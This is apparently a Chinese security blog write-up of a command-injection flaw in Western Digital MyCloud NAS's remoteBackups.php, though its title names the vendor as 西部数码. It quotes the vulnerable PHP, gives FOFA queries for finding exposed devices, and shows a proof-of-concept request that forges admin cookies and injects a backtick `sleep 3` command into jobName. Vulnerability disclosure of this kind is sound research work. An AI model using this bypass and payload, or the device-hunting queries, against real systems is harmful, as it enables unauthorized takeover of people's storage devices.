---
title: "西部数码 NAS php/remoteBackups.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-remoteBackups-rce.html
asset_dir: assets/西部数码-nas-phpremotebackups.php-命令执行漏洞
---

# 西部数码 NAS php/remoteBackups.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/4 15:37
* 725浏览
* [0评论](#comment)
* 17分钟阅读

深入探索

漏洞扫描器

代码安全审计

网络安全培训


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS remoteBackups.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

文本剥离工具

服务器安全服务

授权

直接看 `remoteBackups.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$date = new DateTime();
$r= $date->getTimestamp();

$cmd = $_REQUEST['cmd'];
$RemoteBackupsAPI = new RemoteBackupsAPI;

switch ($cmd) {
    case "getRecoverItems":
       $RemoteBackupsAPI->getRecoverItems();
       break;
}

class RemoteBackupsAPI{
    public function getRecoverItems()
    {
       $xmlPath = "/var/www/xml/rsync_recover_items.xml";
       $jobName = $_REQUEST['jobName'];

       @unlink($xmlPath);

       $cmd = "rsyncmd -l \"$xmlPath\" -r \"$jobName\" >/dev/null";
       system($cmd);

       if (file_exists($xmlPath))
       {
          print file_get_contents($xmlPath);
       }
       else
       {
          print "<config></config>";
       }
    }
}
?>
```

深入探索

网络安全课程

Docker加速服务

安全运维咨询

当**cmd=getRecoverItems**时，从请求中获取 `jobName` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 **$cmd**中，然后用`system()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞扫描服务

# 漏洞复现

```
GET /web/php/remoteBackups.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin

cmd=getRecoverItems&jobName=\"`sleep 3`\"
```

[![西部数码 NAS php/remoteBackups.php 命令执行漏洞](images/img-001-a50b4c2cc2b5.webp)](https://image.mrxn.net/a95d012ed6f8485999855e9109010e61.webp)

成功延时 3 秒

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS php/remoteBackups.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-remoteBackups-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-remoteBackups-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKYklEQVR4AeybgXobOQ6D8+/7v/OeYQYSLXHkiZtkfFv1CwsKAKmxaCVu9u6fj4+Pf/80/h3+5H6DdF9mfczvhuGv0ZPXg/W+zPqZ/F70+dcZf/Z8lv3xGbqnBnLL99e7nEAbyG3SH1+J1QvIfewDPiDCXPY5h/BAR2uuE1YcRI21jKoZw3rmK866NaG5CqV/JXKPNpBM7vy6E5gGAvEugxrPPCr02srvdw90H0Re+VccRB3QbMB0Gy16b6G5jBC10sfIPmuZG3OIXlDj6Nd6GojIHdedwB7IdWdf7vwjA/F1FkJc12p36Q7rXmesNIi+lc9+IYRP+RgQGnR0v+yF0DP3U/mPDOSnHvZv6PutA4H5nbR6x0H4gfaRGzoHx/nZ4VT7r2oh9swe94DQgCx/a/6tA2lPtpOXT2AP5OWj+5nCaSC+nke4egzXAO3fARC5NaF7KHdA+KxVaG/GyrfiIPYBmu1ZP+D+elrBLYGZu9EPX7lvlT+YPxfTQD75DRedQBsIxMThHFbPC1Gb3w2Vb8VVteYg+gOtBXB/90L/YNDEInEvYSEvKdU4VkbozwTP89yrDSSTO7/uBPZArjv7cud/fAX/BMvOAwn96lqCznl/mDn77RFC+JQ7Vj5rEHXQv8VB5ypfxa32tPYK7hvi034TnAYC/d0CkVfPCqFBx8rnd0nWKi7rRzn0vdwDOgdzPvZynXDUXlnD8Z7QtbO9p4GcLbzA91ds2QYCMU29cxw+AQgNMNV+9yRvIz8ToH0U/aSWfnkgatTPAcFJV5gXaj2G+KMYvXmda8xnzrk1ITw+mzgHPNcA29tZAR9tIB/7z1ucwB7IW4yhP0QbiK8l0K6QuYwuhe4zZ5/XQug+iFz8GK6F8ED9sRRCH+vzGsIDZHrKgftrzUL1HBA+axlzrfOsO7eWEea+bSDZuPPrTqANBOZpQXDQ0Y/qyWe0ljHrziH6eS3MNWMuXZF5ONcDwpdrnaunAsIDWHrpQ4h6KYD7zYOObizdYQ66rw3E4sZrT2AP5Nrzn3ZvA/E1gn597LYmNAfdB4+5fI7Kby4jRA/XCSE4CBQ3BoQGHUeP1nkv5xA10h0QHHSsNHPuVaE9Quj9IHLxilzbBpLJvyp/sxe7HIimp6ieWbzD+rg2L7SWEeKdAv0jrrwOe72u0J6M0Pu6xjp0zZw9woqDqJF+FBAeqF/LUd3ILwcymvf6509gD+Tnz/hLO/wDcdWqKniuAVMpMH0Oh5nLhTDrEJx9EGvAVLlPE28J8OC5Ue0LQmtESvytK2OSW8/MOYfoCx2tHfWzvm+IT+JNsA0EYpr5uTxNCA06WhPmmjGX/mqselnLvc1ltG7Oa6E56K/LXIWqcVS6ucpTcfZnbAPJ5M6vO4E9kOvOvty5/a9OrPpqCSGusrWMEBr0z90QnGodENxRLcx69h7lEHXQ0XtmhNDdB2INmHr4RSJw/4HdxFsCwUHHG/3wlfd8EE4scu2+IScO7AXLyyXLj71V1zxN5xDvnHEN8+0Bqrb3dyXwgDau+tqTEXqfzCt3L6HWCuh+8QqYOXnHgPBlHoJTH4d1CA06WhPuG6JTeKNoP0PGSeoZKw76ZCFyeXO4TgjhUT5GrnE+erSG6GHPK6g+ilyrtSJzcLyXvA7XjGvx5iB6QUdrGVXj2DfEJ/EmuAfyJoPwY7Qf6tCvFURuU75eqxyiDjq6B8xc1Qu6DyKvfO6bNQi/tQohPNAx93BNxVkTWofeBx5ze4SqUcCjBxDdYt+QdhTvkbQf6n4cTdNhrkLg4SMq9I+4ld89hTDXQnBVLYQGHSufOe3hMAdRaz6jPUcIUQszVjXuDd1vrvJD9+0bUp3QhdweyIWHX229HAjEVcqFEJyvYEb7Kg6iDvq3tuxz7h4ZrWXM+pjDvNfo0RrCp/zV8DOdrbdfWNUsB1IVbO5nT+DLA9FkFRDvLujoR4WZsyaE0JWfCQg/dHQdzJyezwGhj2voN9W9jtC1FUL0r2qzv9LNZd+XB+ImG3/mBPZAfuZcX+7aBuJrA3EFgdYUOPw3h+uErSAl4hWJav9BCNZ9c41y9XFA1HqdEUIDVHYP4P4a7ovPv2Dm3OfTcgjwWOs6ITxqh00+BQg/sP8vbR9v9mf6XZYmfCagTxUe87OvMe9T1Vi3Bn2fUbPnCO3PeOQVD30vrRXQudxHuXSH1gqvM8JxD9W0b1m5aOfXnUD7XZamo4A+weqxIHR5jyLXQfifce4F4YeOrrVHaA66DyK3lhFmTX0UEBqQS1oOHP78gdCgYytMCYSeqJZCaMAVP0M+9p/FCexvWYvDuUKaBqIr7Fg9EPRrBpHb73rhirN2hKpXVDrEntId9nktNGeEqANMtY/h8gPTtyfxilaQEvFjwNzDJdlrLuM0kCzu/PdPoA0EYqrQ0Y8DncsTdl75IGrsgVgDtt/ficAD2i+0UbnCa6HWCuUOrRXQe1r7KqqPY1ULsVflgdCASi65NpBS3eSvn8AeyK8f+XrD5UCA+7cTX10hBAcdV1tA+LJHfY4Cwg/kksMcuD8jcOjJQt7XPNB6WLcmhNCVn4mqx6rOfuFyIKsmW/uZE2gD0XQUeRutFRDvEOj/UUf8GK4dea2tCSH6KT8TcOxXbwfMPmurfewRfocP4jnUbwwIDTrmPdtAMvn/mP9XnnkP5M0m2X797ufKV6zioF81iHz0eS2E8OS+zqU7YPbBI2fvVxAee0CsgWUboP2gr4zja4DuHzXVQ+jKHZVv3xCfzptg+/X72efxVDO6FuZ3gbUKIfxAJbffMZXiglw9W9aAdgvgMV+0f5DcL5Pw2AvIcsuB+/6NuCX7htwO4Z2+9kDeaRq3Z2kDgbg+8Dre+k1fvtLQ+06mJwRE7RPb8lucn+NPekA8B8z4rG+l+5mg92sDqQo29/sn0Abiaf0J+vGhTxwiz30hOPszQmhApg9z4P6DESg93rcSrWUE7v0y59pnXNaVu06o9RgQe0l3tIGY2JhP4Pfz9g9DiGnB13F87PxOGLWjda5xDvEsRzVneIgecIxVH+j+8XmAqQS43yxg0p4R7i/cN+TZaf2yvgfyywf+bLs2EF2Xr0TV2PXA8vral3tA1GTOPmPWYPZDcNBxrPVa6H7Q/eakOyB0r4X2GcU5zD3Dyt8G8qx4679zAtNAIN4NUOOZx/LkM0Lv5x5ZN1chRG3Wcq1z614LIWqVK+wRan0U0s8ERH+YsaqH7rMOnZsGYtPGa05gD+Sacz/c9VsHAnH18m5wjvO3Dgg/dLSW+35HDn0PiPyrff1sFT7rBfOe3zqQZw+w9TiB1d+/NpBX3kGu8QuAeEdBjZVv7GFPRnuEEL0r/RlnHaKH+jmsZay0XxtIfpCdH5/AHsjx2VyiTAPxNTrC1VO6BuLKAit7+9c80PJcAMGbc/+M1oTmlR8FRE+gWYByfxsgdK+FEBzM6OeAY00eCF25YxqINttx3Qm0gUBMC87h6pE97Ywr/5HmeohnOvKZh/C5TmjNKM5RcaNmzxGu/NYyHvUx3wZiYuO1J7AHcu35T7v/DwAA//+K93FTAAAABklEQVQDAL1vlG6l1nJ1AAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-remoteBackups-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-remoteBackups-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 